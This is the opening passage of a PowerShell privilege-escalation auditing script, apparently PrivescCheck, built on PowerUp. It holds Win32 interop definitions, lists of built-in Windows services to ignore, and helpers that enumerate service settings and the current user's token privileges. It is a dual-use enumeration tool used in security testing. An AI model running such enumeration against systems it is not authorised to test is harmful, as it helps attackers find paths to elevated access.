<#
    This scripts is an extended and updated version of PowerUp. I tried to filter out as many false
    positives as I could and I also added some extra checks based on well known privilege escalation
    cheat sheets (see links below).

    Author: @itm4n
    Credit: @harmj0y @mattifestation
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
    
    Links:
        https://github.com/itm4n
        https://github.com/HarmJ0y/PowerUp
        https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
        https://book.hacktricks.xyz/windows/windows-local-privilege-escalation  
#>

#Requires -Version 2

# ----------------------------------------------------------------
# Win32 stuff  
# ----------------------------------------------------------------
#region Win32
<#
https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/
#>
$CSharpSource = @'
private const Int32 ANYSIZE_ARRAY = 1;

[System.FlagsAttribute]
public enum ServiceAccessFlags : uint
{
    QueryConfig = 1,
    ChangeConfig = 2,
    QueryStatus = 4,
    EnumerateDependents = 8,
    Start = 16,
    Stop = 32,
    PauseContinue = 64,
    Interrogate = 128,
    UserDefinedControl = 256,
    Delete = 65536,
    ReadControl = 131072,
    WriteDac = 262144,
    WriteOwner = 524288,
    Synchronize = 1048576,
    AccessSystemSecurity = 16777216,
    GenericAll = 268435456,
    GenericExecute = 536870912,
    GenericWrite = 1073741824,
    GenericRead = 2147483648
}

[StructLayout(LayoutKind.Sequential)]
public struct LUID {
   public UInt32 LowPart;
   public Int32 HighPart;
}

[StructLayout(LayoutKind.Sequential)]
public struct SID_AND_ATTRIBUTES {
    public IntPtr Sid;
    public int Attributes;
}

[StructLayout(LayoutKind.Sequential, Pack = 4)]
public struct LUID_AND_ATTRIBUTES {
   public LUID Luid;
   public UInt32 Attributes;
}

public struct TOKEN_USER {
    public SID_AND_ATTRIBUTES User;
}

public struct TOKEN_PRIVILEGES {
    public int PrivilegeCount;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst=ANYSIZE_ARRAY)]
    public LUID_AND_ATTRIBUTES [] Privileges;
}

[StructLayout(LayoutKind.Sequential)]
public struct MIB_TCPROW_OWNER_PID
{
    public uint state;
    public uint localAddr;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
    public byte[] localPort;
    public uint remoteAddr;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
    public byte[] remotePort;
    public uint owningPid;
}

[StructLayout(LayoutKind.Sequential)]
public struct MIB_UDPROW_OWNER_PID
{
    public uint localAddr;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
    public byte[] localPort;
    public uint owningPid;
}

[StructLayout(LayoutKind.Sequential)]
public struct MIB_TCP6ROW_OWNER_PID
{
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
    public byte[] localAddr;
    public uint localScopeId;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
    public byte[] localPort;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
    public byte[] remoteAddr;
    public uint remoteScopeId;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
    public byte[] remotePort;
    public uint state;
    public uint owningPid;
}

[StructLayout(LayoutKind.Sequential)]
public struct MIB_UDP6ROW_OWNER_PID
{
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
    public byte[] localAddr;
    public uint localScopeId;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
    public byte[] localPort;
    public uint owningPid;
}

[StructLayout(LayoutKind.Sequential)]
public struct MIB_TCPTABLE_OWNER_PID
{
    public uint dwNumEntries;
    [MarshalAs(UnmanagedType.ByValArray, ArraySubType = UnmanagedType.Struct, SizeConst = 1)]
    public MIB_TCPROW_OWNER_PID[] table;
}

[StructLayout(LayoutKind.Sequential)]
public struct MIB_UDPTABLE_OWNER_PID
{
    public uint dwNumEntries;
    [MarshalAs(UnmanagedType.ByValArray, ArraySubType = UnmanagedType.Struct, SizeConst = 1)]
    public MIB_UDPROW_OWNER_PID[] table;
}

[StructLayout(LayoutKind.Sequential)]
public struct MIB_TCP6TABLE_OWNER_PID
{
    public uint dwNumEntries;
    [MarshalAs(UnmanagedType.ByValArray, ArraySubType = UnmanagedType.Struct, SizeConst = 1)]
    public MIB_TCP6ROW_OWNER_PID[] table;
}

[StructLayout(LayoutKind.Sequential)]
public struct MIB_UDP6TABLE_OWNER_PID
{
    public uint dwNumEntries;
    [MarshalAs(UnmanagedType.ByValArray, ArraySubType = UnmanagedType.Struct, SizeConst = 1)]
    public MIB_UDP6ROW_OWNER_PID[] table;
}

[DllImport("advapi32.dll", SetLastError=true)]
public static extern bool QueryServiceObjectSecurity(IntPtr serviceHandle, System.Security.AccessControl.SecurityInfos secInfo, byte[] lpSecDesrBuf, uint bufSize, out uint bufSizeNeeded);

[DllImport("advapi32.dll", SetLastError=true)]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool CloseServiceHandle(IntPtr hSCObject);

[DllImport("advapi32.dll", SetLastError=true)]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);

[DllImport("advapi32.dll", SetLastError=true)]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool GetTokenInformation(IntPtr TokenHandle, UInt32 TokenInformationClass, IntPtr TokenInformation, UInt32 TokenInformationLength, out UInt32 ReturnLength);

[DllImport("advapi32.dll", CharSet=CharSet.Auto, SetLastError = true)]
public static extern bool LookupAccountSid(string lpSystemName, IntPtr Sid, System.Text.StringBuilder lpName, ref uint cchName, System.Text.StringBuilder ReferencedDomainName, ref uint cchReferencedDomainName, out int peUse);

[DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool LookupPrivilegeName(string lpSystemName, IntPtr lpLuid, System.Text.StringBuilder lpName, ref int cchName );

[DllImport("kernel32.dll", SetLastError=true)]
public static extern IntPtr GetCurrentProcess();

[DllImport("kernel32.dll", SetLastError = true)]
public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

[DllImport("kernel32.dll", SetLastError=true)]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool CloseHandle(IntPtr hObject);

[DllImport("kernel32.dll")]
public static extern UInt64 GetTickCount64();

[DllImport("kernel32.dll", CharSet=CharSet.Auto, SetLastError=true)]
public static extern uint GetFirmwareEnvironmentVariable(string lpName, string lpGuid, IntPtr pBuffer, uint nSize);

[DllImport("kernel32.dll", SetLastError=true)]
public static extern bool GetFirmwareType(ref uint FirmwareType);

[DllImport("iphlpapi.dll", SetLastError=true)]
public static extern uint GetExtendedTcpTable(IntPtr pTcpTable, ref int pdwSize, bool bOrder, int ulAf, uint TableClass, uint Reserved);

[DllImport("iphlpapi.dll", SetLastError=true)]
public static extern uint GetExtendedUdpTable(IntPtr pUdpTable, ref int pdwSize, bool bOrder, int ulAf, uint TableClass, uint Reserved);
'@

try {
    # Is the Type already defined?
    [PrivescCheck.Win32] | Out-Null 
} catch {
    # If not, create it by compiling the C# code in memory 
    $CompilerParameters = New-Object -TypeName System.CodeDom.Compiler.CompilerParameters
    $CompilerParameters.GenerateInMemory = 1
    Add-Type -MemberDefinition $CSharpSource -Name 'Win32' -Namespace 'PrivescCheck' -Language CSharp -CompilerParameters $CompilerParameters
}
#endregion Win32


# ----------------------------------------------------------------
# Helpers 
# ----------------------------------------------------------------
#region Helpers 
$global:IgnoredPrograms = @("Common Files", "Internet Explorer", "ModifiableWindowsApps", "PackageManagement", "VMware", "Windows Defender", "Windows Defender Advanced Threat Protection", "Windows Mail", "Windows Media Player", "Windows Multimedia Platform", "Windows NT", "Windows Photo Viewer", "Windows Portable Devices", "Windows Security", "WindowsPowerShell", "Microsoft.NET", "Windows Portable Devices", "dotnet", "MSBuild", "Intel", "Reference Assemblies")

$global:IgnoredServices = @("1394ohci", "3ware", "AarSvc", "ACPI", "AcpiDev", "acpiex", "acpipagr", "AcpiPmi", "acpitime", "Acx01000", "ADOVMPPackage", "ADP80XX", "adsi", "ADWS", "AeLookupSvc", "AFD", "afunix", "ahcache", "AJRouter", "ALG", "amdgpio2", "amdi2c", "AmdK8", "AmdPPM", "amdsata", "amdsbs", "amdxata", "AppID", "AppIDSvc", "Appinfo", "applockerfltr", "AppMgmt", "AppReadiness", "AppHostSvc", "AppVClient", "AppvStrm", "AppvVemgr", "AppvVfs", "AppXSvc", "arcsas", "aspnet_state", "AssignedAccessManagerSvc", "AsyncMac", "atapi", "AudioEndpointBuilder", "Audiosrv", "autotimesvc", "AxInstSV", "b06bdrv", "bam", "BasicDisplay", "BasicRender", "BattC", "BcastDVRUserService", "bcmfn2", "BDESVC", "Beep", "BFE", "bindflt", "BITS", "BluetoothUserService", "bowser", "BrokerInfrastructure", "Browser", "BTAGService", "BthA2dp", "BthAvctpSvc", "BthEnum", "BthHFEnum", "BthLEEnum", "BthMini", "BTHMODEM", "BthPan", "BTHPORT", "bthserv", "BTHUSB", "bttflt", "buttonconverter", "CAD", "camsvc", "CaptureService", "cbdhsvc", "cdfs", "CDPSvc", "CDPUserSvc", "cdrom", "CertPropSvc", "cht4iscsi", "cht4vbd", "CimFS", "circlass", "CldFlt", "CLFS", "ClipSVC", "CmBatt", "CNG", "cnghwassist", "CompositeBus", "COMSysApp", "condrv", "ConsentUxUserSvc", "CoreMessagingRegistrar", "CoreUI", "CredentialEnrollmentManagerUserSvc", "crypt32", "CryptSvc", "CSC", "CscService", "dam", "DCLocator", "DcomLaunch", "defragsvc", "DeviceAssociationBrokerSvc", "DeviceAssociationService", "DeviceInstall", "DevicePickerUserSvc", "DevicesFlowUserSvc", "DevQueryBroker", "Dfs", "Dfsc", "DFSR", "Dhcp", "diagnosticshub.standardcollector.service", "diagsvc", "DiagTrack", "disk", "DispBrokerDesktopSvc", "DisplayEnhancementService", "DmEnrollmentSvc", "dmvsc", "dmwappushservice", "DNS", "Dnscache", "DoSvc", "dot3svc", "DPS", "drmkaud", "DsmSvc", "DsRoleSvc", "DsSvc", "DusmSvc", "DXGKrnl", "e1i65x64", "Eaphost", "ebdrv", "EFS", "ehRecvr", "ehSched", "EhStorClass", "EhStorTcgDrv", "embeddedmode", "EntAppSvc", "ErrDev", "ESENT", "EventLog", "EventSystem", "exfat", "fastfat", "Fax", "fdc", "fdPHost", "FDResPub", "fhsvc", "FileCrypt", "FileInfo", "Filetrace", "flpydisk", "FltMgr", "FontCache", "FrameServer", "FsDepends", "Fs_Rec", "fvevol", "gencounter", "genericusbfn", "GPIOClx0101", "gpsvc", "GpuEnergyDrv", "GraphicsPerfSvc", "HdAudAddService", "HDAudBus", "HidBatt", "HidBth", "hidi2c", "hidinterrupt", "HidIr", "hidserv", "hidspi", "HidUsb", "hkmsvc", "HomeGroupListener", "HomeGroupProvider", "HpSAMD", "HTTP", "hvcrash", "HvHost", "hvservice", "HwNClx0101", "hwpolicy", "hyperkbd", "HyperVideo", "i8042prt", "iagpio", "iai2c", "iaStorAV", "iaStorAVC", "iaStorV", "ibbus", "icssvc", "idsvc", "IEEtwCollectorService", "IKEEXT", "IndirectKmd", "inetaccs", "InstallService", "intelide", "intelpep", "intelpmax", "intelppm", "iorate", "IPBusEnum", "IpFilterDriver", "iphlpsvc", "IPMIDRV", "IPNAT", "IPT", "IpxlatCfgSvc", "isapnp", "iScsiPrt", "IsmServ", "ItSas35i", "kbdclass", "kbdhid", "Kdc", "KdsSvc", "kdnic", "KeyIso", "KPSSVC", "KSecDD", "KSecPkg", "ksthunk", "KtmRm", "LanmanServer", "LanmanWorkstation", "ldap", "lfsvc", "LicenseManager", "lltdio", "lltdsvc", "lmhosts", "Lsa", "LSI_SAS", "LSI_SAS2i", "LSI_SAS3i", "LSI_SSS", "LSM", "luafv", "LxpSvc", "MapsBroker", "mausbhost", "mausbip", "MbbCx", "Mcx2Svc", "megasas", "megasas2i", "megasas35i", "megasr", "MessagingService", "Microsoft_Bluetooth_AvrcpTransport", "MixedRealityOpenXRSvc", "mlx4_bus", "MMCSS", "Modem", "monitor", "mouclass", "mouhid", "mountmgr", "mpsdrv", "mpssvc", "MRxDAV", "mrxsmb", "mrxsmb20", "MsBridge", "Msfs", "msgpiowin32", "mshidkmdf", "mshidumdf", "msisadrv", "MSiSCSI", "msiserver", "MSKSSRV", "MsLldp", "MSPCLOCK", "MSPQM", "MsQuic", "MsRPC", "MSSCNTRS", "MsSecFlt", "mssmbios", "MSTEE", "MTConfig", "Mup", "mvumis", "napagent", "NativeWifiP", "NaturalAuthentication", "NcaSvc", "NcbService", "NcdAutoSetup", "ndfltr", "NDIS", "NdisCap", "NdisImPlatform", "NdisTapi", "Ndisuio", "NdisVirtualBus", "NdisWan", "ndiswanlegacy", "NDKPing", "ndproxy", "Ndu", "NetAdapterCx", "NetBIOS", "NetbiosSmb", "NetBT", "NetMsmqActivator", "NetPipeActivator", "NetTcpActivator", "Netlogon", "Netman", "netprofm", "NetSetupSvc", "NetTcpPortSharing", "netvsc", "NgcCtnrSvc", "NgcSvc", "NlaSvc", "Npfs", "npsvctrig", "nsi", "nsiproxy", "NTDS", "Ntfs", "NtFrs", "Null", "nvdimm", "nvraid", "nvstor", "OneSyncSvc", "p2pimsvc", "p2psvc", "Parport", "partmgr", "PcaSvc", "pci", "pciide", "pcmcia", "pcw", "pdc", "PEAUTH", "PeerDistSvc", "perceptionsimulation", "percsas2i", "percsas3i", "PerfDisk", "PerfHost", "PerfNet", "PerfOS", "PerfProc", "PhoneSvc", "PimIndexMaintenanceSvc", "PktMon", "pla", "PlugPlay", "pmem", "PNPMEM", "PNRPAutoReg", "PNRPsvc", "PolicyAgent", "portcfg", "PortProxy", "Power", "PptpMiniport", "PrintNotify", "PrintWorkflowUserSvc", "Processor", "ProfSvc", "ProtectedStorage", "Psched", "PushToInstall", "pvscsi", "QWAVE", "QWAVEdrv", "Ramdisk", "RasAcd", "RasAgileVpn", "RasAuto", "Rasl2tp", "RasMan", "RasPppoe", "RasSstp", "rdbss", "RDMANDK", "rdpbus", "RDPDR", "RDPNP", "RDPUDD", "RdpVideoMiniport", "rdyboost", "ReFS", "ReFSv1", "RemoteAccess", "RemoteRegistry", "RetailDemo", "RFCOMM", "rhproxy", "RmSvc", "RpcEptMapper", "RpcLocator", "RpcSs", "RSoPProv", "rspndr", "s3cap", "sacsvr", "SamSs", "sbp2port", "SCardSvr", "ScDeviceEnum", "scfilter", "Schedule", "scmbus", "SCPolicySvc", "sdbus", "SDFRd", "SDRSVC", "sdstor", "seclogon", "SecurityHealthService", "SEMgrSvc", "SENS", "Sense", "SensorDataService", "SensorService", "SensrSvc", "SerCx", "SerCx2", "Serenum", "Serial", "sermouse", "SessionEnv", "sfloppy", "SgrmAgent", "SgrmBroker", "SharedAccess", "SharedRealitySvc", "ShellHWDetection", "shpamsvc", "SiSRaid2", "SiSRaid4", "SmartSAMD", "smbdirect", "smphost", "SmsRouter", "SMSvcHost 4.0.0.0", "SNMPTRAP", "spaceparser", "spaceport", "SpatialGraphFilter", "SpbCx", "spectrum", "Spooler", "sppsvc", "sppuinotify", "srv2", "srvnet", "SSDPSRV", "ssh-agent", "SstpSvc", "StateRepository", "stexstor", "stisvc", "storahci", "storflt", "stornvme", "storqosflt", "StorSvc", "storufs", "storvsc", "svsvc", "swenum", "swprv", "Synth3dVsc", "SysMain", "SystemEventsBroker", "TabletInputService", "TapiSrv", "Tcpip", "Tcpip6", "TCPIP6TUNNEL", "tcpipreg", "TCPIPTUNNEL", "tdx", "Telemetry", "terminpt", "TermService", "Themes", "TieringEngineService", "TimeBroker", "TimeBrokerSvc", "THREADORDER", "TokenBroker", "TPM", "TrkWks", "TroubleshootingSvc", "TrustedInstaller", "TSDDD", "TsUsbFlt", "TsUsbGD", "tsusbhub", "tunnel", "tzautoupdate", "UALSVC", "UASPStor", "UcmCx0101", "UcmTcpciCx0101", "UcmUcsiAcpiClient", "UcmUcsiCx0101", "Ucx01000", "UdeCx", "udfs", "UdkUserSvc", "UEFI", "UevAgentDriver", "UevAgentService", "Ufx01000", "UfxChipidea", "ufxsynopsys", "UGatherer", "UGTHRSVC", "UI0Detect", "umbus", "UmPass", "UmRdpService", "UnistoreSvc", "upnphost", "UrsChipidea", "UrsCx01000", "UrsSynopsys", "usbaudio", "usbaudio2", "usbccgp", "usbcir", "usbehci", "usbhub", "USBHUB3", "usbohci", "usbprint", "usbser", "USBSTOR", "usbuhci", "USBXHCI", "UserDataSvc", "UserManager", "UsoSvc", "UxSms", "VacSvc", "VaultSvc", "vdrvroot", "vds", "VerifierExt", "VGAuthService", "vhdmp", "vhf", "Vid", "VirtualRender", "vm3dmp", "vm3dmp-debug", "vm3dmp-stats", "vm3dmp_loader", "vmbus", "VMBusHID", "vmci", "vmgid", "vmhgfs", "vmicguestinterface", "vmicheartbeat", "vmickvpexchange", "vmicrdv", "vmicshutdown", "vmictimesync", "vmicvmsession", "vmicvss", "VMMemCtl", "vmmouse", "vmrawdsk", "vmusbmouse", "vmvss", "vmwefifw", "vmxnet3ndis6", "volmgr", "volmgrx", "volsnap", "volume", "vpci", "vsmraid", "vsock", "VSS", "VSTXRAID", "vwifibus", "vwififlt", "W32Time", "w3logsvc", "W3SVC", "WaaSMedicSvc", "WAS", "WacomPen", "WalletService", "wanarp", "wanarpv6", "WarpJITSvc", "WatAdminSvc", "wbengine", "WbioSrvc", "wcifs", "Wcmsvc", "wcncsvc", "wcnfs", "WcsPlugInService", "WdBoot", "Wdf01000", "WdFilter", "WdiServiceHost", "WdiSystemHost", "wdiwifi", "WdmCompanionFilter", "WdNisDrv", "WdNisSvc", "WebClient", "Wecsvc", "WEPHOSTSVC", "wercplsupport", "WerSvc", "WFDSConMgrSvc", "WFPLWFS", "WiaRpc", "WIMMount", "WinDefend", "Windows Workflow Foundation 4.0.0.0", "WindowsTrustedRT", "WindowsTrustedRTProxy", "WinHttpAutoProxySvc", "WinMad", "Winmgmt", "WinNat", "WinRM", "Winsock", "WinSock2", "WINUSB", "WinVerbs", "wisvc", "WlanSvc", "wlidsvc", "WLMS", "wlpasvc", "WManSvc", "WmiAcpi", "WmiApRpl", "wmiApSrv", "WMPNetworkSvc", "Wof", "workerdd", "workfolderssvc", "WpcMonSvc", "WPCSvc", "WPDBusEnum", "WpdUpFltr", "WpnService", "WpnUserService", "ws2ifsl", "wscsvc", "WSearch", "WSearchIdxPi", "WSService", "wuauserv", "WudfPf", "WUDFRd", "wudfsvc", "WwanSvc", "XblAuthManager", "XblGameSave", "xboxgip", "XboxGipSvc", "XboxNetApiSvc", "xinputhid", "xmlprov")

function Convert-DateToString {
    <#
    .SYNOPSIS

    Helper - Converts a DateTime object to a string representation

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    The output string is a simplified version of the ISO format: YYYY-MM-DD hh:mm:ss. 
    
    .PARAMETER Date

    A System.DateTime object
    
    .EXAMPLE

    PS C:\> $Date = Get-Date; Convert-DateToString -Date $Date

    2020-01-16 - 10:26:11
    
    #>
    
    [CmdletBinding()] param(
        [System.DateTime]
        $Date
    )

    $OutString = ""
    $OutString += $Date.ToString('yyyy-MM-dd - HH:mm:ss')
    #$OutString += " ($($Date.ToString('o')))" # ISO format
    $OutString
}

function Convert-ServiceTypeToString {
    <#
    .SYNOPSIS

    Helper - Converts a service type (integer) to its actual name

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    Services have a type which is saved as an integer in the registry. This function will retrieve
    the "name" of the type based on this integer value.
    
    .PARAMETER ServiceType

    A service type as an integer
    
    .EXAMPLE

    PS C:\> Convert-ServiceTypeToString -ServiceType 16
    
    Win32OwnProcess
    
    #>
    
    [CmdletBinding()] param(
        [int]
        $ServiceType
    )

    $ServiceTypeEnum = @{
        "KernelDriver" =        "1";
        "FileSystemDriver" =    "2";
        "Adapter" =             "4";
        "RecognizerDriver" =    "8";
        "Win32OwnProcess" =     "16";
        "Win32ShareProcess" =   "32";
        "InteractiveProcess" =  "256";
    }

    $ServiceTypeEnum.GetEnumerator() | ForEach-Object { 
        if ( $_.value -band $ServiceType ) 
        {
            $_.name
        }
    }
}

function Convert-ServiceStartModeToString {
    <#
    .SYNOPSIS

    Helper - Convert a Start mode (integer) to its actual name

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    Services have a Start mode (e.g.: Automatic), which is saved as an integer in the registry.
    This function will retrieve the "name" of the Start mode based on this integer value. 
    
    .PARAMETER StartMode

    A Start mode as an integer
    
    .EXAMPLE

    PS C:\> Convert-ServiceStartModeToString -StartMode 2

    Automatic

    #>
    
    [CmdletBinding()] param(
        [int]
        $StartMode
    )

    $StartModeEnum = @{
        "Boot" =        "0";
        "System" =      "1";
        "Automatic" =   "2";
        "Manual" =      "3";
        "Disabled" =    "4";
    }

    $StartModeEnum.GetEnumerator() | ForEach-Object { 
        if ( $_.Value -eq $StartMode ) 
        {
            $_.Name
        }
    }
}

function Test-IsKnownService {
    <#
    .SYNOPSIS

    Helper - Compares a service name against a list of known service name patterns

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    In Windows 10, a lot of services were added. Although they are the same, their name will vary 
    from an installation to another. The pattern of their name is "service_XXXXXXXX" where 
    "XXXXXXXX" is random hexadecimal string which is "unique" to an installation of Windows. The
    aim of this function is to determine whether a given service name matches this pattern.
    
    .PARAMETER ServiceName

    The name of a service as a String
    
    .EXAMPLE

    PS C:\> Test-IsKnownService -ServiceName 'CaptureService_1fe3b73d'
    
    True
    
    #>
    
    [CmdletBinding()] param(
        [string]
        $ServiceName
    )

    $KnownServices = @("AarSvc_*", "BcastDVRUserService_*", "BluetoothUserService_*", "CaptureService_*", "cbdhsvc_*", "CDPUserSvc_*", "clr_optimization_*", "ConsentUxUserSvc_*", "CredentialEnrollmentManagerUserSvc_*", "DeviceAssociationBrokerSvc_*", "DevicePickerUserSvc_*", "DevicesFlowUserSvc_*", "FontCache*", "iaLPSS*", "IpOverUsbSvc", "MessagingService_*", "MSDTC*", ".NET*", "OneSyncSvc_*", "PimIndexMaintenanceSvc_*", "PrintWorkflowUserSvc_*", "UdkUserSvc_*", "UnistoreSvc_*", "UserDataSvc_*", "WpnUserService_*")

    if ($global:IgnoredServices -contains $ServiceName) {
        return $True 
    } else {
        ForEach ($KnownService in $KnownServices) {
            if ($ServiceName -like $KnownService) {
                return $True 
            }
        }
    }
    return $False 
}

function Get-UserPrivileges {
    <#
    .SYNOPSIS

    Helper - Enumerates the privileges of the current user 

    Author: @itm4n
    License: BSD 3-Clause
    
    .DESCRIPTION

    Enumerates the privileges of the current user using the Windows API. First, it gets a handle 
    to the current access token using OpenProcessToken. Then it calls GetTokenInformation to list
    all the privileges that it contains along with their state (enabled/disabled). For each result
    a custom object is returned, indicating the name of the privilege and its state. 
    
    .EXAMPLE

    PS C:\> Get-UserPrivileges

    Name                          State    Description
    ----                          ------   -----------
    SeShutdownPrivilege           Disabled Shut down the system
    SeChangeNotifyPrivilege       Enabled  Bypass traverse checking
    SeUndockPrivilege             Disabled Remove computer from docking station
    SeIncreaseWorkingSetPrivilege Disabled Increase a process working set
    SeTimeZonePrivilege           Disabled Change the time zone

    .LINK

    https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants
    #>
    
    [CmdletBinding()] param()

    function Get-PrivilegeDescription {
        [CmdletBinding()] param(
            [string]
            $Name
        )

        $PrivilegeDescriptions = @{
            "SeAssignPrimaryTokenPrivilege" =               "Replace a process-level token";
            "SeAuditPrivilege" =                            "Generate security audits";
            "SeBackupPrivilege" =                           "Back up files and directories";
            "SeChangeNotifyPrivilege" =                     "Bypass traverse checking";
            "SeCreateGlobalPrivilege" =                     "Create global objects";
            "SeCreatePagefilePrivilege" =                   "Create a pagefile";
            "SeCreatePermanentPrivilege" =                  "Create permanent shared objects";
            "SeCreateSymbolicLinkPrivilege" =               "Create symbolic links";
            "SeCreateTokenPrivilege" =                      "Create a token object";
            "SeDebugPrivilege" =                            "Debug programs";
            "SeDelegateSessionUserImpersonatePrivilege" =   "Impersonate other users";
            "SeEnableDelegationPrivilege" =                 "Enable computer and user accounts to be trusted for delegation";
            "SeImpersonatePrivilege" =                      "Impersonate a client after authentication";
            "SeIncreaseBasePriorityPrivilege" =             "Increase scheduling priority";
            "SeIncreaseQuotaPrivilege" =                    "Adjust memory quotas for a process";
            "SeIncreaseWorkingSetPrivilege" =               "Increase a process working set";
            "SeLoadDriverPrivilege" =                       "Load and unload device drivers";
            "SeLockMemoryPrivilege" =                       "Lock pages in memory";
            "SeMachineAccountPrivilege" =                   "Add workstations to domain";
            "SeManageVolumePrivilege" =                     "Manage the files on a volume";
            "SeProfileSingleProcessPrivilege" =             "Profile single process";
            "SeRelabelPrivilege" =                          "Modify an object label";
            "SeRemoteShutdownPrivilege" =                   "Force shutdown from a remote system";
            "SeRestorePrivilege" =                          "Restore files and directories";
            "SeSecurityPrivilege" =                         "Manage auditing and security log";
            "SeShutdownPrivilege" =                         "Shut down the system";
            "SeSyncAgentPrivilege" =                        "Synchronize directory service data";
            "SeSystemEnvironmentPrivilege" =                "Modify firmware environment values";
            "SeSystemProfilePrivilege" =                    "Profile system performance";
            "SeSystemtimePrivilege" =                       "Change the system time";
            "SeTakeOwnershipPrivilege" =                    "Take ownership of files or other objects";
            "SeTcbPrivilege" =                              "Act as part of the operating system";
            "SeTimeZonePrivilege" =                         "Change the time zone";
            "SeTrustedCredManAccessPrivilege" =             "Access Credential Manager as a trusted caller";
            "SeUndockPrivilege" =                           "Remove computer from docking station";
            "SeUnsolicitedInputPrivilege" =                 "N/A";
        }

        $PrivilegeDescriptions[$Name]

    }

    # Get a handle to a process the current user owns 
    $ProcessHandle = [PrivescCheck.Win32]::GetCurrentProcess()
    Write-Verbose "Current process handle: $ProcessHandle"

    # Get a handle to the token corresponding to this process 
    $TOKEN_QUERY= 0x0008
    [IntPtr]$TokenHandle = [IntPtr]::Zero
    $Success = [PrivescCheck.Win32]::OpenProcessToken($ProcessHandle, $TOKEN_QUERY, [ref]$TokenHandle);
    $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

    if ($Success) {

        Write-Verbose "OpenProcessToken() OK - Token handle: $TokenHandle"

        # TOKEN_INFORMATION_CLASS - 3 = TokenPrivileges
        $TokenPrivilegesPtrSize = 0
        $Success = [PrivescCheck.Win32]::GetTokenInformation($TokenHandle, 3, 0, $Null, [ref]$TokenPrivilegesPtrSize)
        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

        if (-not ($TokenPrivilegesPtrSize -eq 0)) {

            Write-Verbose "GetTokenInformation() OK - TokenPrivilegesPtrSize = $TokenPrivilegesPtrSize"

            [IntPtr]$TokenPrivilegesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivilegesPtrSize)

            $Success = [PrivescCheck.Win32]::GetTokenInformation($TokenHandle, 3, $TokenPrivilegesPtr, $TokenPrivilegesPtrSize, [ref]$TokenPrivilegesPtrSize)
            $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            if ($Success) {

                # Convert the unmanaged memory at offset $TokenPrivilegesPtr to a TOKEN_PRIVILEGES managed type 
                $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesPtr, [type] [PrivescCheck.Win32+TOKEN_PRIVILEGES])
                #$Offset = [System.IntPtr]::Add($TokenPrivilegesPtr, 4)
                # Properly Incrementing an IntPtr
                # https://docs.microsoft.com/en-us/archive/blogs/jaredpar/properly-incrementing-an-intptr
                $Offset = [IntPtr] ($TokenPrivilegesPtr.ToInt64() + 4)
                
                Write-Verbose "GetTokenInformation() OK - Privilege count: $($TokenPrivileges.PrivilegeCount)"

                For ($i = 0; $i -lt $TokenPrivileges.PrivilegeCount; $i++) {

                    # Cast the unmanaged memory at offset 
                    $LuidAndAttributes = [System.Runtime.InteropServices.Marshal]::PtrToStructure($Offset, [type] [PrivescCheck.Win32+LUID_AND_ATTRIBUTES])
                    
                    # Copy LUID to unmanaged memory 
                    $LuidSize = [System.Runtime.InteropServices.Marshal]::SizeOf($LuidAndAttributes.Luid)
                    [IntPtr]$LuidPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($LuidSize)
                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($LuidAndAttributes.Luid, $LuidPtr, $True)

                    # public static extern bool LookupPrivilegeName(string lpSystemName, IntPtr lpLuid, System.Text.StringBuilder lpName, ref int cchName );
                    [int]$Length = 0
                    $Success = [PrivescCheck.Win32]::LookupPrivilegeName($Null, $LuidPtr, $Null, [ref]$Length)
                    $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                    if (-not ($Length -eq 0)) {

                        Write-Verbose "LookupPrivilegeName() OK - Length = $Length"

                        $Name = New-Object -TypeName System.Text.StringBuilder
                        $Name.EnsureCapacity($Length + 1) |Out-Null
                        $Success = [PrivescCheck.Win32]::LookupPrivilegeName($Null, $LuidPtr, $Name, [ref]$Length)
                        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if ($Success) {

                            $PrivilegeName = $Name.ToString()

                            # SE_PRIVILEGE_ENABLED = 0x00000002
                            $PrivilegeEnabled = ($LuidAndAttributes.Attributes -band 2) -eq 2

                            Write-Verbose "LookupPrivilegeName() OK - Name: $PrivilegeName - Enabled: $PrivilegeEnabled"

                            $PrivilegeObject = New-Object -TypeName PSObject 
                            $PrivilegeObject | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $PrivilegeName
                            $PrivilegeObject | Add-Member -MemberType "NoteProperty" -Name "State" -Value $(if ($PrivilegeEnabled) { "Enabled" } else { "Disabled" })
